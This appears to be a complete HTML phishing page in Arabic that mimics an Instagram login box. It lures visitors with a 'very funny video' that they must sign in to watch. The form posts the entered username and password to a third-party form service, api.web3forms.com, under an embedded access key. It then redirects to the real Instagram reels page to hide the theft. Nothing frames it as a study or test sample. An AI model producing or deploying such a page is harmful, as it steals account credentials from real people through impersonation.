<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        .video { width: 100%; height: 180px; background: #000 url('https://img.freepik.com/free-photo/funny-face-man_23-2148110595.jpg') center/cover; border-radius: 4px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; cursor: pointer; }
        .play { width: 50px; height: 50px; background: rgba(255,255,255,0.8); border-radius: 50%; position: relative; }
        .play::after { content: ''; position: absolute; border-style: solid; border-width: 10px 0 10px 15px; border-color: transparent transparent transparent #262626; top: 15px; left: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1bcf9b12e34d.png" class="logo">
        <div class="video"><div class="play"></div></div>
        <p style="font-weight: bold;">فيديو مضحك جداً! 😂</p>
        <p style="color: #8e8e8e; font-size: 13px;">سجل الدخول للمشاهدة</p>
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="07448344-92a7-4aab-b61e-7e8b136f4bd7">
            <input type="text" name="username" placeholder="اسم المستخدم" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <input type="hidden" name="redirect" value="https://www.instagram.com/reels/">
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
